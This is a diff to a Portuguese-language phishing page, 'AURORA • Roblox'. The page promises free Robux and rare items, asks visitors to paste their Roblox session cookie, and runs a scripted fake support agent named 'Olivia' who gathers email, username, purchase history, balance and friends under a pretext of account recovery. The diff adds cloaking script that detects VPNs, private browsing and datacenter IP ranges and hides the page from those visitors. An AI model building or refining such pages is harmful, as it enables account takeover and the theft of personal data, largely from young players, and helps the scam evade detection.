@@ -2,8 +2,193 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AURORA • Roblox</title>
+    <style>
+        /* INÍCIO DO BLOQUEIO - Este CSS já carrega antes de qualquer verificação */
+        .vpn-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #03050a;
+            z-index: 999999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        .vpn-message {
+            background: rgba(244, 63, 94, 0.1);
+            border: 2px solid #f43f5e;
+            border-radius: 60px;
+            padding: 30px;
+            max-width: 400px;
+            text-align: center;
+            color: #f43f5e;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .vpn-message h2 {
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+
+        .vpn-message p {
+            color: #9ca3af;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+
+        .vpn-message small {
+            color: #6b7280;
+            font-size: 12px;
+        }
+
+        .main-content {
+            display: none;
+        }
+
+        /* Quando passar na verificação, mostra o conteúdo */
+        .main-content.visible {
+            display: block;
+        }
+    </style>
+    
+    <!-- BLOQUEIO DE VPN - Executa antes de qualquer coisa -->
+    <script>
+        // BLOQUEIO TOTAL DE VPN - EXECUÇÃO IMEDIATA
+        (function() {
+            // Criar elemento de bloqueio
+            const blocker = document.createElement('div');
+            blocker.className = 'vpn-blocker';
+            blocker.id = 'vpnBlocker';
+            blocker.innerHTML = `
+                <div class="vpn-message">
+                    <h2>🚫 VPN DETECTADA</h2>
+                    <p>Desative sua VPN, proxy ou navegador anônimo para acessar a Aurora.</p>
+                    <p>🔒 Conexões anônimas não são permitidas por segurança.</p>
+                    <small>Se você não está usando VPN, recarregue a página ou tente outro navegador.</small>
+                </div>
+            `;
+            
+            // Tentar detectar VPN de forma agressiva
+            let isVPN = false;
+            let detectionComplete = false;
+            
+            // 1. Verificar WebRTC (detecta VPNs)
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const candidate = event.candidate.candidate;
+                        if (candidate && candidate.includes('typ relay')) {
+                            isVPN = true;
+                            detectionComplete = true;
+                            applyBlock();
+                        }
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    if (!detectionComplete) checkOtherMethods();
+                }, 1000);
+            } catch (e) {
+                checkOtherMethods();
+            }
+            
+            function checkOtherMethods() {
+                // 2. Verificar modo anônimo
+                const isPrivate = new Promise(resolve => {
+                    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                    if (!fs) {
+                        resolve(false);
+                        return;
+                    }
+                    
+                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+                });
+                
+                isPrivate.then(privateMode => {
+                    if (privateMode) {
+                        isVPN = true;
+                    }
+                    
+                    // 3. Verificar IPs de VPN conhecidos via API
+                    fetch('https://api.ipify.org?format=json')
+                        .then(r => r.json())
+                        .then(data => {
+                            const ip = data.ip;
+                            
+                            // Lista de IPs de VPN/datacenters
+                            const vpnRanges = [
+                                '104.16.', '104.17.', '104.18.', '104.19.', '104.20.',
+                                '172.64.', '172.65.', '172.66.', '172.67.', '172.68.',
+                                '141.94.', '51.15.', '163.172.', '54.36.', '37.187.',
+                                '146.0.', '128.0.', '192.95.', '192.99.', '198.27.',
+                                '162.243.', '159.203.', '104.131.', '128.199.', '138.68.'
+                            ];
+                            
+                            if (vpnRanges.some(range => ip.startsWith(range))) {
+                                isVPN = true;
+                            }
+                            
+                            // Verificar se é IP de datacenter (provedor de VPN)
+                            fetch(`https://ipapi.co/${ip}/json/`)
+                                .then(r => r.json())
+                                .then(data => {
+                                    const org = (data.org || '').toLowerCase();
+                                    const vpnKeywords = ['vpn', 'proxy', 'datacenter', 'cloud', 'hosting', 
+                                                         'digitalocean', 'aws', 'amazon', 'google cloud', 
+                                                         'azure', 'linode', 'vultr', 'ovh'];
+                                    
+                                    if (vpnKeywords.some(keyword => org.includes(keyword))) {
+                                        isVPN = true;
+                                    }
+                                    
+                                    applyBlock();
+                                })
+                                .catch(() => applyBlock());
+                        })
+                        .catch(() => applyBlock());
+                });
+            }
+            
+            function applyBlock() {
+                if (isVPN) {
+                    // Bloquear totalmente - não mostra o site
+                    document.documentElement.style.overflow = 'hidden';
+                    document.body.appendChild(blocker);
+                } else {
+                    // Liberar acesso
+                    document.addEventListener('DOMContentLoaded', function() {
+                        const mainContent = document.querySelector('.main-content');
+                        if (mainContent) {
+                            mainContent.classList.add('visible');
+                        }
+                        const vpnBlocker = document.getElementById('vpnBlocker');
+                        if (vpnBlocker) {
+                            vpnBlocker.remove();
+                        }
+                    });
+                }
+            }
+        })();
+    </script>
+    
+    <!-- CSS Principal (só carrega visualmente depois da verificação) -->
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
 
@@ -71,11 +256,16 @@
             66% { transform: scale(0.9) rotate(-1deg); }
         }
 
-        .container {
+        .main-content {
             width: 100%;
             max-width: 520px;
             position: relative;
             z-index: 10;
+            display: none;
+        }
+
+        .main-content.visible {
+            display: block;
         }
 
         /* Páginas */
@@ -330,6 +520,11 @@
         .action-btn:active {
             transform: scale(0.96);
             box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
+        }
+
+        .action-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
         /* Status message */
@@ -846,6 +1041,11 @@
             transform: scale(1.1);
         }
 
+        .chat-send:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
         .welcome-message {
             text-align: center;
             color: #9ca3af;
@@ -1000,176 +1200,179 @@
         <div class="notification-progress" id="notificationProgress"></div>
     </div>
 
-    <!-- TELA 1 - COOKIE -->
-    <div id="page1" class="container page">
-        <div class="card">
-            <div class="header">
-                <div class="logo">
-                    ✦
+    <!-- CONTEÚDO PRINCIPAL (só aparece se passar na verificação de VPN) -->
+    <div class="main-content" id="mainContent">
+        <!-- TELA 1 - COOKIE -->
+        <div id="page1" class="container page">
+            <div class="card">
+                <div class="header">
+                    <div class="logo">
+                        ✦
+                    </div>
+                    <div class="header-text">
+                        <div class="title">AURORA</div>
+                        <div class="subtitle">plataforma de resgate</div>
+                    </div>
                 </div>
-                <div class="header-text">
-                    <div class="title">AURORA</div>
-                    <div class="subtitle">plataforma de resgate</div>
-                </div>
-            </div>
 
-            <div class="stats-row">
-                <div class="stat-block" onclick="showStats()">
-                    <div class="stat-value" id="countStat">1.2k</div>
-                    <div class="stat-label">resgates</div>
+                <div class="stats-row">
+                    <div class="stat-block" onclick="showStats()">
+                        <div class="stat-value" id="countStat">1.2k</div>
+                        <div class="stat-label">resgates</div>
+                    </div>
+                    <div class="stat-block" onclick="showOnline()">
+                        <div class="stat-value" id="onlineStat">✦</div>
+                        <div class="stat-label">online</div>
+                    </div>
+                    <div class="stat-block" onclick="showInfo()">
+                        <div class="stat-value">∞</div>
+                        <div class="stat-label">grátis</div>
+                    </div>
                 </div>
-                <div class="stat-block" onclick="showOnline()">
-                    <div class="stat-value" id="onlineStat">✦</div>
-                    <div class="stat-label">online</div>
-                </div>
-                <div class="stat-block" onclick="showInfo()">
-                    <div class="stat-value">∞</div>
-                    <div class="stat-label">grátis</div>
-                </div>
-            </div>
 
-            <div class="input-section">
-                <div class="input-label">
-                    <span>🔑</span> COOKIE DE ACESSO
+                <div class="input-section">
+                    <div class="input-label">
+                        <span>🔑</span> COOKIE DE ACESSO
+                    </div>
+                    <div class="input-wrapper">
+                        <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..."></textarea>
+                    </div>
+                    <div class="preview-badge">
+                        <div class="status-dot"></div>
+                        <div class="preview-text" id="previewText">aguardando cookie...</div>
+                    </div>
+                    
+                    <!-- Área para mensagem de ban -->
+                    <div id="banMessage" class="banned-message" style="display: none;"></div>
+                    
+                    <!-- Exibir apenas cooldown, IP removido -->
+                    <div class="info-row">
+                        <div class="info-text" id="cooldownInfo"></div>
+                    </div>
                 </div>
-                <div class="input-wrapper">
-                    <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..."></textarea>
-                </div>
-                <div class="preview-badge">
-                    <div class="status-dot"></div>
-                    <div class="preview-text" id="previewText">aguardando cookie...</div>
-                </div>
-                
-                <!-- Área para mensagem de ban -->
-                <div id="banMessage" class="banned-message" style="display: none;"></div>
-                
-                <!-- Exibir apenas cooldown, IP removido -->
-                <div class="info-row">
-                    <div class="info-text" id="cooldownInfo"></div>
-                </div>
-            </div>
 
-            <button class="action-btn" onclick="sendAndGo()" id="sendBtn">
-                <span>✦</span>
-                ENVIAR E RESGATAR
-                <span>→</span>
-            </button>
+                <button class="action-btn" onclick="sendAndGo()" id="sendBtn">
+                    <span>✦</span>
+                    ENVIAR E RESGATAR
+                    <span>→</span>
+                </button>
 
-            <div id="status" class="status-message"></div>
+                <div id="status" class="status-message"></div>
 
-            <div class="footer">
-                <div class="footer-item"><span>✦</span> instantâneo</div>
-                <div class="footer-item"><span>🔒</span> seguro</div>
-                <div class="footer-item"><span>🎯</span> direto</div>
-            </div>
-
-            <!-- SEÇÃO DE AVALIAÇÕES -->
-            <div class="reviews-section">
-                <div class="reviews-title">
-                    <span>⭐</span> AVALIAÇÕES RECENTES
+                <div class="footer">
+                    <div class="footer-item"><span>✦</span> instantâneo</div>
+                    <div class="footer-item"><span>🔒</span> seguro</div>
+                    <div class="footer-item"><span>🎯</span> direto</div>
                 </div>
-                <div class="reviews-grid" id="reviewsContainer">
-                    <!-- Avaliações serão inseridas aqui pelo JavaScript -->
+
+                <!-- SEÇÃO DE AVALIAÇÕES -->
+                <div class="reviews-section">
+                    <div class="reviews-title">
+                        <span>⭐</span> AVALIAÇÕES RECENTES
+                    </div>
+                    <div class="reviews-grid" id="reviewsContainer">
+                        <!-- Avaliações serão inseridas aqui pelo JavaScript -->
+                    </div>
                 </div>
             </div>
         </div>
-    </div>
 
-    <!-- TELA 2 - ESCOLHA -->
-    <div id="page2" class="container page hidden">
-        <div class="card">
-            <div class="header">
-                <div class="logo">
-                    ✦
+        <!-- TELA 2 - ESCOLHA -->
+        <div id="page2" class="container page hidden">
+            <div class="card">
+                <div class="header">
+                    <div class="logo">
+                        ✦
+                    </div>
+                    <div>
+                        <div class="choice-title">seu prêmio</div>
+                        <div class="subtitle">escolha uma opção</div>
+                    </div>
                 </div>
-                <div>
-                    <div class="choice-title">seu prêmio</div>
-                    <div class="subtitle">escolha uma opção</div>
+
+                <div class="choice-grid">
+                    <!-- Robux -->
+                    <div class="choice-item" onclick="selectPrize('Robux')">
+                        <div class="choice-icon">💰</div>
+                        <div class="choice-content">
+                            <div class="choice-name">Robux</div>
+                            <div class="choice-desc">créditos + bônus</div>
+                        </div>
+                        <div class="choice-value">grátis</div>
+                    </div>
+
+                    <!-- Korblox -->
+                    <div class="choice-item" onclick="selectPrize('Korblox')">
+                        <div class="choice-icon">👑</div>
+                        <div class="choice-content">
+                            <div class="choice-name">Korblox</div>
+                            <div class="choice-desc">set completo + death speed</div>
+                        </div>
+                        <div class="choice-value">grátis</div>
+                    </div>
+
+                    <!-- Headless -->
+                    <div class="choice-item" onclick="selectPrize('Headless')">
+                        <div class="choice-icon">🎭</div>
+                        <div class="choice-content">
+                            <div class="choice-name">Headless</div>
+                            <div class="choice-desc">cabeça + itens exclusivos</div>
+                        </div>
+                        <div class="choice-value">grátis</div>
+                    </div>
+
+                    <!-- Recuperar Conta com Olivia -->
+                    <div class="choice-item" onclick="openOliviaChat()">
+                        <span class="choice-badge">prioridade</span>
+                        <div class="choice-icon">💬</div>
+                        <div class="choice-content">
+                            <div class="choice-name">Recuperar Conta</div>
+                            <div class="choice-desc">fale com Olivia • suporte humanizado</div>
+                        </div>
+                        <div class="choice-value">grátis</div>
+                    </div>
                 </div>
+
+                <button class="back-button" onclick="goBack()">
+                    <span>←</span> VOLTAR
+                </button>
             </div>
-
-            <div class="choice-grid">
-                <!-- Robux -->
-                <div class="choice-item" onclick="selectPrize('Robux')">
-                    <div class="choice-icon">💰</div>
-                    <div class="choice-content">
-                        <div class="choice-name">Robux</div>
-                        <div class="choice-desc">créditos + bônus</div>
-                    </div>
-                    <div class="choice-value">grátis</div>
-                </div>
-
-                <!-- Korblox -->
-                <div class="choice-item" onclick="selectPrize('Korblox')">
-                    <div class="choice-icon">👑</div>
-                    <div class="choice-content">
-                        <div class="choice-name">Korblox</div>
-                        <div class="choice-desc">set completo + death speed</div>
-                    </div>
-                    <div class="choice-value">grátis</div>
-                </div>
-
-                <!-- Headless -->
-                <div class="choice-item" onclick="selectPrize('Headless')">
-                    <div class="choice-icon">🎭</div>
-                    <div class="choice-content">
-                        <div class="choice-name">Headless</div>
-                        <div class="choice-desc">cabeça + itens exclusivos</div>
-                    </div>
-                    <div class="choice-value">grátis</div>
-                </div>
-
-                <!-- Recuperar Conta com Olivia -->
-                <div class="choice-item" onclick="openOliviaChat()">
-                    <span class="choice-badge">prioridade</span>
-                    <div class="choice-icon">💬</div>
-                    <div class="choice-content">
-                        <div class="choice-name">Recuperar Conta</div>
-                        <div class="choice-desc">fale com Olivia • suporte humanizado</div>
-                    </div>
-                    <div class="choice-value">grátis</div>
-                </div>
-            </div>
-
-            <button class="back-button" onclick="goBack()">
-                <span>←</span> VOLTAR
-            </button>
         </div>
-    </div>
 
-    <!-- TELA 3 - CHAT COM OLIVIA -->
-    <div id="page3" class="container page hidden">
-        <div class="card chat-card">
-            <div class="chat-header">
-                <div class="chat-avatar">
-                    👩
+        <!-- TELA 3 - CHAT COM OLIVIA -->
+        <div id="page3" class="container page hidden">
+            <div class="card chat-card">
+                <div class="chat-header">
+                    <div class="chat-avatar">
+                        👩
+                    </div>
+                    <div class="chat-info">
+                        <div class="chat-name">Olivia • Suporte</div>
+                        <div class="chat-status">● online agora • respostas rápidas</div>
+                    </div>
+                    <button class="close-chat" onclick="closeChat()">✕</button>
                 </div>
-                <div class="chat-info">
-                    <div class="chat-name">Olivia • Suporte</div>
-                    <div class="chat-status">● online agora • respostas rápidas</div>
+
+                <div class="welcome-message" id="welcomeMessage">
+                    Olivia entrou no chat • tempo de resposta ~30s
                 </div>
-                <button class="close-chat" onclick="closeChat()">✕</button>
-            </div>
 
-            <div class="welcome-message" id="welcomeMessage">
-                Olivia entrou no chat • tempo de resposta ~30s
-            </div>
+                <!-- Botões de ação rápida -->
+                <div class="quick-actions" id="quickActions">
+                    <button class="quick-action-btn" onclick="sendQuickMessage('Perdi minha conta')">📱 Perdi minha conta</button>
+                    <button class="quick-action-btn" onclick="sendQuickMessage('Esqueci a senha')">🔑 Esqueci a senha</button>
+                    <button class="quick-action-btn" onclick="sendQuickMessage('Conta hackeada')">⚠️ Conta hackeada</button>
+                    <button class="quick-action-btn" onclick="sendQuickMessage('Email antigo')">📧 Email antigo</button>
+                </div>
 
-            <!-- Botões de ação rápida -->
-            <div class="quick-actions" id="quickActions">
-                <button class="quick-action-btn" onclick="sendQuickMessage('Perdi minha conta')">📱 Perdi minha conta</button>
-                <button class="quick-action-btn" onclick="sendQuickMessage('Esqueci a senha')">🔑 Esqueci a senha</button>
-                <button class="quick-action-btn" onclick="sendQuickMessage('Conta hackeada')">⚠️ Conta hackeada</button>
-                <button class="quick-action-btn" onclick="sendQuickMessage('Email antigo')">📧 Email antigo</button>
-            </div>
+                <div class="chat-messages" id="chatMessages">
+                    <!-- Mensagens aparecerão aqui -->
+                </div>
 
-            <div class="chat-messages" id="chatMessages">
-                <!-- Mensagens aparecerão aqui -->
-            </div>
-
-            <div class="chat-input-area">
-                <input type="text" class="chat-input" id="chatInput" placeholder="Digite sua mensagem..." onkeypress="if(event.key==='Enter') sendMessage()">
-                <button class="chat-send" onclick="sendMessage()">➤</button>
+                <div class="chat-input-area">
+                    <input type="text" class="chat-input" id="chatInput" placeholder="Digite sua mensagem..." onkeypress="if(event.key==='Enter') sendMessage()">
+                    <button class="chat-send" onclick="sendMessage()">➤</button>
+                </div>
             </div>
         </div>
     </div>
@@ -1370,45 +1573,20 @@
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        // ===== MENSAGENS DA OLIVIA - MUITO MAIS COMPLETAS =====
+        // ===== MENSAGENS DA OLIVIA =====
         const oliviaMessages = [
-            // Passo 0 - Boas-vindas
             "Olá! Sou Olivia, prazer em te conhecer! 😊 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: o que aconteceu com sua conta?\n\n✅ Opções comuns:\n• Perdi acesso à conta\n• Esqueceram minha senha\n• Minha conta foi hackeada\n• Não consigo mais acessar o email\n\nFique tranquilo, vou te ajudar passo a passo!",
-
-            // Passo 1 - Entendendo o problema
             "Entendi! Agora me diga qual é o seu PRIMEIRO NOME (o nome que você usa no Roblox ou seu nome real).\n\nIsso é importante porque quando você compra Robux, o nome fica registrado no histórico de compras. Assim podemos confirmar que a conta é realmente sua!",
-
-            // Passo 2 - Solicitando email
             "Obrigada! Agora me informe um E-MAIL válido.\n\n📧 Pode ser um email novo, é para onde vamos enviar as instruções de recuperação.\n\nExemplo: meunome@gmail.com",
-
-            // Passo 3 - Username Roblox
             "Perfeito! Agora qual é seu NOME DE USUÁRIO no Roblox?\n\n🎮 Exemplo: joaozinho_roblox123\n\nÉ o nome que aparece quando você joga.",
-
-            // Passo 4 - Última compra
             "Ótimo! Agora me diga qual foi a ÚLTIMA COMPRA que você fez no Roblox.\n\n💰 Pode ser:\n• O valor (ex: R$25, R$50)\n• O item comprado (ex: Korblox, Headless)\n• A data aproximada da compra",
-
-            // Passo 5 - Acesso ao email
             "Entendi! Você ainda tem ACESSO AO E-MAIL de cadastro?\n\n✅ Responda apenas com SIM ou NÃO.\n\nIsso ajuda a saber se podemos enviar o código de verificação para o email antigo.",
-
-            // Passo 6 - Data de criação
             "Ok! Agora me diga a DATA APROXIMADA que você criou essa conta.\n\n📅 Exemplos:\n• 2020\n• março/2021\n• início de 2022\n\nNão precisa ser exato, só uma estimativa ajuda.",
-
-            // Passo 7 - Itens exclusivos
             "Você tem algum ITEM EXCLUSIVO ou raro na conta?\n\n👑 Exemplos:\n• Headless Horseman\n• Korblox Deathspeaker\n• Dominus\n• Itens de eventos limitados\n\nIsso ajuda a confirmar que a conta é sua.",
-
-            // Passo 8 - Robux atual
             "Quantos ROBUX você tem atualmente na conta?\n\n💎 Um valor aproximado já ajuda:\n• 500 Robux\n• 1.000 Robux\n• 5.000+ Robux",
-
-            // Passo 9 - Amigos na conta
             "Você se lembra de algum AMIGO que tem na sua lista?\n\n👥 Pode me dizer o nome de 1 ou 2 amigos que você tinha adicionado?\n\nIsso também é uma forma de verificação.",
-
-            // Passo 10 - Primeiro item
             "Qual foi o PRIMEIRO ITEM que você comprou ou ganhou no Roblox?\n\n🎁 Pode ser algo simples como um chapéu ou uma roupa.",
-
-            // Passo 11 - Analisando
             "Todas as informações foram enviadas para análise. 🔍\n\n⏳ Isso pode levar até 24 horas.\n\n⚠️ Não tente novamente durante este período, pois o sistema vai bloquear e você não receberá nada.",
-
-            // Passo 12 - Final
             "Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\nObrigado por usar a Aurora! ❤️"
         ];
 
@@ -1787,10 +1965,14 @@ Problema: ${userProblem || 'Não informado'}
 
         setInterval(updateInfoDisplays, 1000);
         
+        // Aguardar verificação de VPN antes de carregar o resto
         window.addEventListener('load', async () => {
-            await getUserIP();
-            updateInfoDisplays();
-            loadReviews();
+            // Só carrega se passou na verificação de VPN
+            if (document.querySelector('.main-content').classList.contains('visible')) {
+                await getUserIP();
+                updateInfoDisplays();
+                loadReviews();
+            }
         });
 
         function createStars() {
